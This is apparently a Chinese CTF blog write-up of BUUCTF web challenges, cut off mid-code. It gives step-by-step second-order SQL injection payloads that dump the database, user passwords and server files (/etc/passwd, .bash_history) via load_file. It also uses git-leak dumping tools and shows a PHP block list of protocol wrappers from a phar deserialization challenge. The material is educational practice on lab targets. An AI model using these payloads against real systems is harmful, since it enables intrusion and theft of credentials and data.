无溢出则跳转</td><td></td><td>OF&#x3D;0</td></tr><tr><td>js有符号跳转</td><td></td><td>SF&#x3D;1</td></tr><tr><td>jns无符号跳转</td><td></td><td>SF&#x3D;0</td></tr><tr><td>jp偶校验跳转</td><td></td><td>PF&#x3D;1</td></tr><tr><td>jnp奇校验跳转</td><td></td><td>PF&#x3D;0</td></tr><tr><td>jb jl小于则跳转 jnae jna jng jnge不大于则跳转</td><td>a&lt;b a&lt;&#x3D;b</td><td></td></tr><tr><td>ja jg大于则跳转 jnbe  jnb jnl jnle不小于则跳转</td><td>a&gt;b a&gt;&#x3D;b</td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_web部分刷题记录_PART4</title>
      <link href="/post/a65f6ebf.html"/>
      <url>/post/a65f6ebf.html</url>
      
        <content type="html"><![CDATA[<h1 id="git泄露-二次注入-DS-store-Comment"><a href="#git泄露-二次注入-DS-store-Comment" class="headerlink" title="[git泄露,二次注入,DS_store]Comment"></a>[git泄露,二次注入,DS_store]Comment</h1><p>进来点击发帖提示需要登录</p><img src="/images/buuctf-web4/image-20221029093005915.png" alt="image-20221029093005915" style="zoom:67%;" /><p>这里提示了账号密码, 试了几个,用<code>zhangwei</code>,<code>zhangwei666</code>成功登录</p><p><code>dirsearch</code>扫一下目录,发现了<code>git</code>泄露, 用<code>githack</code>工具利用一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/GitHack-master]</span><br><span class="line">└─$ python3 GitHack.py http://67c8a88a-4595-4e9d-b3c0-a1be143a5475.node4.buuoj.cn:81/.git/</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">[+] write_do.php</span><br><span class="line">[OK] write_do.php</span><br></pre></td></tr></table></figure><p><code>write_do.php</code>: 这里代码好像也不完整</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再使用<code>githacker</code>来利用一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\githacker\GitHacker\GitHacker&gt;py __init__.py --url http://67c8a88a-4595-4e9d-b3c0-a1be143a5475.node4.buuoj.cn:81/.git/ --output-folder result --delay 1 --enable-manually-check-dangerous-git-files</span><br><span class="line"></span><br><span class="line">进入下载到的目录  git log命令查看提交版本历史  --reflog可以看到被删除的版本</span><br><span class="line">E:\CTF工具合集\githacker\GitHacker\GitHacker\result\948ab5ce2d37a87bde45797c5f372f91&gt;git log --reflog</span><br><span class="line">commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)</span><br><span class="line">Merge: bfbdf21 5556e3a</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    WIP on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    index on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master, origin/master, origin/HEAD)</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:47:29 2018 +0800</span><br><span class="line"></span><br><span class="line">    add write_do.php</span><br><span class="line">    </span><br><span class="line">git reset --hard 恢复到历史版本</span><br><span class="line">E:\CTF工具合集\githacker\GitHacker\GitHacker\result\948ab5ce2d37a87bde45797c5f372f91&gt;git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">HEAD is now at e5b2a24 WIP on master: bfbdf21 add write_do.php</span><br></pre></td></tr></table></figure><p>这样以来, 就得到了老版本的<code>write_do.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试分析一下代码: 这里执行三次sql,两次插入,一次查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">第一次: 将发帖的内容插入到board表中</span><br><span class="line">&quot;insert into board</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                title = &#x27;$title&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;&quot;;</span><br><span class="line">第二次: 评论时首先根据bo_id从表中取出&#x27;category&#x27;</span><br><span class="line">select category from board where id=&#x27;$bo_id&#x27;</span><br><span class="line"></span><br><span class="line">第三次:将评论的内容插入comment表中, 注意到这里直接将上一步取出的category直接插入了进去</span><br><span class="line">&quot;insert into comment</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;,</span><br><span class="line">                bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里发现三次的联系在于<code>category</code>这个字段<br>且提交评论后,<code>comment</code>的<code> content</code>这个字段会回显,所以我们利用这个字段来回显我们想查询的信息</p><p>从第三次查询入手, 我们需要<strong>让<code>content</code>的内容摆脱引号的控制</strong>,且为我们所控制</p><p>那么可以在<code>category</code>中让引号提前闭合:  在发帖页面填写:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">category的值为 :  &#x27;,content=version(),/*   </span><br><span class="line">其他两个值随便</span><br></pre></td></tr></table></figure><p>这里第一个单引号用于闭合前面的单引号, 后面跟上一个我们伪造的<code>content</code>字段, 最后的<code>/*</code>可以进行跨行注释,要和<code>*/</code>配对</p><p>然后再到留言页面时, 首先会执行第二次查询, 将我们刚刚添加的<code>category</code>字段的值从<code>board</code>表中取出来,准备插入到<code>comment</code>表中</p><p>这样,我们在留言内容(也就是<code>comment</code>表的<code>content</code>字段)中插入:<code>*/#</code>, 与前面<code>category</code>中的<code>*/</code>闭合,注释掉中间的<code>content=&#39;</code> ,<code>#</code>注释掉后面的剩余语句, 这样以来, <code>comment</code>表中<code>content</code>的值就变成了我们控制的<code>content=version()</code> ,并回显在评论页面:</p><img src="/images/buuctf-web4/image-20221029112733071.png" alt="image-20221029112733071" style="zoom:67%;" /><p>同样的方法:</p><p>发帖中,<code>category</code>填写: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=database(),/* </span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web4/image-20221029112933341.png" alt="image-20221029112933341"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(select group_concat(table_name) from information_schema.TABLES where table_schema=database()),/* </span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web4/image-20221029113143712.png" alt="image-20221029113143712" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema=database() and table_name=&#x27;user&#x27;),/* </span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web4/image-20221029113315064.png" alt="image-20221029113315064"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(select group_concat(password) from user),/* </span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web4/image-20221029113449424.png" alt="image-20221029113449424"></p><p>这里到最后也没有发现flag,换个思路: 查看一下数据库的账户:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=user(),/*</span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br><span class="line">root@localhost</span><br></pre></td></tr></table></figure><p>发现是<code>root</code>用户,尝试读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(select load_file(&#x27;/var/www/html/flag.php&#x27;)),/* </span><br><span class="line">&#x27;,content=(select load_file(&#x27;/var/www/html/flag.txt&#x27;)),/* </span><br><span class="line">&#x27;,content=(select load_file(&#x27;/var/www/html/flag&#x27;)),/* </span><br><span class="line">&#x27;,content=(select load_file(&#x27;/flag&#x27;)),/*</span><br><span class="line">到这里都没有找到flag的信息,尝试读取一下其他敏感文件</span><br><span class="line">&#x27;,content=(select load_file(&#x27;/etc/passwd&#x27;)),/*   发现了名为www的用户</span><br><span class="line">&#x27;,content=(select load_file(&#x27;/home/www/.bash_history&#x27;)),/*</span><br><span class="line">输出:</span><br><span class="line">cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start</span><br><span class="line"></span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这里发现曾经在/tmp页面解压过zip文件,且没有删除</span><br><span class="line">&#x27;,content=(select load_file(&#x27;/tmp/html/.DS_Store&#x27;)),/*  </span><br><span class="line">&#x27;,content=(select hex(load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/* 上面出来是乱码,所以将其转为16进制输出,然后转为字符串</span><br><span class="line">这里发现了flag文件的名称:</span><br><span class="line">flag_8946e1ff1ee3e40f.php</span><br><span class="line"></span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web4/image-20221029115625879.png" alt="image-20221029115625879"></p><p>读取flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(select load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;)),/*  </span><br><span class="line">&#x27;,content=(select load_file(&#x27;/tmp/html/flag_8946e1ff1ee3e40f.php&#x27;)),/*  </span><br><span class="line">这里这两个地方读取到的flag是不一样的...第一个才能正确提交</span><br><span class="line"></span><br><span class="line">留言填写:</span><br><span class="line">*/#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里补充知识点:</p><blockquote><p><code>.DS_Store</code>(英文全称 <code>Desktop Services Store</code>)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 <code>Windows</code> 下的 <code>desktop.ini</code>。</p><p>读取该文件能够获得当前的目录结构</p></blockquote><br><hr><br><h1 id="phar反序列化-文件上传-SimplePHP"><a href="#phar反序列化-文件上传-SimplePHP" class="headerlink" title="[phar反序列化,文件上传]SimplePHP"></a>[phar反序列化,文件上传]SimplePHP</h1><p>能够上传文件, 且还有个文件上传的功能</p><p><img src="/images/buuctf-web4/image-20221029123120229.png" alt="image-20221029123120229"></p><p>直接先利用文件包含读取一下源码, 先试了一下<code>php</code>伪协议发现读不出来, 后来直接使用文件名就读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://98289a0e-df99-4f7a-aaa2-5eaba2bb0fa4.node4.buuoj.cn:81/file.php?file=file.php</span><br></pre></td></tr></table></figure><p><code>file.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>class.php</code>: (<strong>反序列化?</strong>)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg 这里提示了上传phar!!然后通过phar://访问!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span 